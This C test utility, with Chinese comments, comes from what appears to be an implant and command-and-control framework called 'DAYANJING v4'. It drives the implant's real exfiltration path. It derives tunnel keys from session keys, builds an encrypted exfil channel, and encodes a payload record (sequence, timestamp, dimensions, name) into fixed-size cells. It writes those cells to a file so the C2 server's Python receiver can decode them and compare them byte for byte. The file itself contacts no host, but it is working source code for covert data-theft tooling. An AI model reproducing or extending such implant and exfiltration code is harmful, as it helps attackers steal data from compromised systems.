/*
 * DAYANJING v4 — 21_exfil/tests/dump_cells.c
 *
 * 跨语言对齐工具：用 **C 侧真实代码路径** 生成回传信元流，写到文件，
 * 供 13_c2_server（Python 侧 ExfilSink）解出并逐字节比对。
 *
 * 为什么需要它：
 *   Python 侧接收端是照着 C 侧常量复刻的。若只让 Python 自己编码再自己解，
 *   常量漂移会被"两边同步错"掩盖，测不出来。必须由 C 侧真编码、Python 侧真解码，
 *   才能证明两端对同一份线上字节的理解一致。
 *
 * 本程序走的是完整生产路径（不是固定常量）：
 *   会话密钥 k_c2s/k_s2c
 *     -> p2p_tunnel_init_from_session（等同 Python derive_tunnel_keys）
 *     -> exfil_chan_init
 *     -> exfil_chan_send（定长信元流）
 *
 * 用法：
 *   dump_cells <out> <k_c2s_hex> <k_s2c_hex> <server_id_hex> \
 *              <implant_id> <type> <seq> <ts_us> <w> <h> <flags> <name> <payload_file|'-'>
 *
 * 退出码 0 表示成功；stderr 打印 n_cells 供调用方核对。
 */

#include "exfil.h"
#include "p2p_crypto.h"
#include "crypto_hash.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int hexdec(const char *s, uint8_t *out, size_t cap, size_t *out_len) {
    if (!s || !out || !out_len) return -1;
    size_t n = strlen(s);
    if (n % 2 != 0) return -1;
    if (n / 2 > cap) return -1;
    for (size_t i = 0; i < n / 2; i++) {
        unsigned v = 0;
        if (sscanf(s + i * 2, "%2x", &v) != 1) return -1;
        out[i] = (uint8_t)v;
    }
    *out_len = n / 2;
    return 0;
}

static uint8_t *slurp(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return NULL; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return NULL; }
    rewind(f);
    uint8_t *b = (uint8_t *)malloc((size_t)sz + 1);
    if (!b) { fclose(f); return NULL; }
    size_t got = fread(b, 1, (size_t)sz, f);
    fclose(f);
    if (got != (size_t)sz) { free(b); return NULL; }
    *out_len = got;
    return b;
}

int main(int argc, char **argv) {
    if (argc != 14) {
        fprintf(stderr,
                "usage: %s <out> <k_c2s_hex> <k_s2c_hex> <server_id_hex> "
                "<implant_id> <type> <seq> <ts_us> <w> <h> <flags> <name> <payload_file|->\n",
                argv[0]);
        return 2;
    }

    const char *out_path   = argv[1];
    const char *k_c2s_hex  = argv[2];
    const char *k_s2c_hex  = argv[3];
    const char *srv_hex    = argv[4];
    const char *implant_id = argv[5];

    uint8_t k_c2s[P2P_KEY_LEN], k_s2c[P2P_KEY_LEN], server_id[P2P_C_ID_LEN];
    size_t n1 = 0, n2 = 0, n3 = 0;
    if (hexdec(k_c2s_hex, k_c2s, sizeof k_c2s, &n1) != 0 || n1 != P2P_KEY_LEN) {
        fprintf(stderr, "bad k_c2s hex\n"); return 2;
    }
    if (hexdec(k_s2c_hex, k_s2c, sizeof k_s2c, &n2) != 0 || n2 != P2P_KEY_LEN) {
        fprintf(stderr, "bad k_s2c hex\n"); return 2;
    }
    if (hexdec(srv_hex, server_id, sizeof server_id, &n3) != 0 || n3 != P2P_C_ID_LEN) {
        fprintf(stderr, "bad server_id hex\n"); return 2;
    }

    unsigned long type   = strtoul(argv[6],  NULL, 0);
    unsigned long long seq   = strtoull(argv[7], NULL, 0);
    unsigned long long ts_us = strtoull(argv[8], NULL, 0);
    unsigned long w      = strtoul(argv[9],  NULL, 0);
    unsigned long h      = strtoul(argv[10], NULL, 0);
    unsigned long flags  = strtoul(argv[11], NULL, 0);
    const char *name     = argv[12];
    const char *pay_path = argv[13];

    uint8_t *payload = NULL;
    size_t   plen = 0;
    if (strcmp(pay_path, "-") != 0) {
        payload = slurp(pay_path, &plen);
        if (!payload) { fprintf(stderr, "cannot read payload\n"); return 2; }
    }

    /* 节点 ID：implant_id -> 16 字节。必须与 Python derive_node_id 一致：
       SHA-256(implant_id) 前 16 字节 */
    uint8_t implant_node[P2P_C_ID_LEN];
    uint8_t dig[SHA256_DIGEST_LEN];
    sha256((const uint8_t *)implant_id, strlen(implant_id), dig);
    memcpy(implant_node, dig, P2P_C_ID_LEN);

    /* 隧道密钥：implant 是 local，server 是 peer */
    p2p_tunnel_t tun;
    int rc = p2p_tunnel_init_from_session(&tun, k_c2s, k_s2c,
                                          implant_node, server_id);
    if (rc != P2P_C_OK) {
        fprintf(stderr, "tunnel derive failed: %d\n", rc);
        free(payload);
        return 3;
    }

    exfil_chan_t ch;
    if (exfil_chan_init(&ch, tun.k_send, tun.k_recv, tun.nonce_pfx, 0) != EXF_OK) {
        fprintf(stderr, "chan init failed\n");
        p2p_tunnel_wipe(&tun);
        free(payload);
        return 3;
    }

    exfil_rec_t rec;
    memset(&rec, 0, sizeof rec);
    rec.type    = (uint32_t)type;
    rec.seq     = seq;
    rec.ts_us   = ts_us;
    rec.width   = (uint32_t)w;
    rec.height  = (uint32_t)h;
    rec.flags   = (uint32_t)flags;
    snprintf(rec.name, sizeof rec.name, "%s", name);
    rec.payload = payload;
    rec.plen    = plen;

    size_t n_cells = 0;
    if (exfil_send_cells(&rec, &n_cells) != EXF_OK) {
        fprintf(stderr, "send_cells failed\n");
        exfil_chan_wipe(&ch); p2p_tunnel_wipe(&tun); free(payload);
        return 3;
    }
    if (n_cells == 0 || n_cells > (1u << 20)) {
        fprintf(stderr, "n_cells out of range: %zu\n", n_cells);
        exfil_chan_wipe(&ch); p2p_tunnel_wipe(&tun); free(payload);
        return 3;
    }

    size_t bytes = n_cells * P2P_CELL_WIRE;
    uint8_t *wire = (uint8_t *)malloc(bytes);
    if (!wire) {
        fprintf(stderr, "oom\n");
        exfil_chan_wipe(&ch); p2p_tunnel_wipe(&tun); free(payload);
        return 3;
    }

    size_t got = 0;
    rc = exfil_chan_send(&ch, &rec, wire, bytes, &got);
    if (rc != EXF_OK || got != n_cells) {
        fprintf(stderr, "chan_send failed rc=%d got=%zu want=%zu\n", rc, got, n_cells);
        memset(wire, 0, bytes); free(wire);
        exfil_chan_wipe(&ch); p2p_tunnel_wipe(&tun); free(payload);
        return 3;
    }

    FILE *f = fopen(out_path, "wb");
    if (!f) {
        fprintf(stderr, "cannot open output\n");
        memset(wire, 0, bytes); free(wire);
        exfil_chan_wipe(&ch); p2p_tunnel_wipe(&tun); free(payload);
        return 3;
    }
    size_t wrote = fwrite(wire, 1, bytes, f);
    if (fclose(f) != 0 || wrote != bytes) {
        fprintf(stderr, "short write\n");
        memset(wire, 0, bytes); free(wire);
        exfil_chan_wipe(&ch); p2p_tunnel_wipe(&tun); free(payload);
        return 3;
    }

    memset(wire, 0, bytes);
    free(wire);
    exfil_chan_wipe(&ch);
    p2p_tunnel_wipe(&tun);
    free(payload);

    fprintf(stderr, "n_cells=%zu payload=%zu\n", n_cells, plen);
    return 0;
}
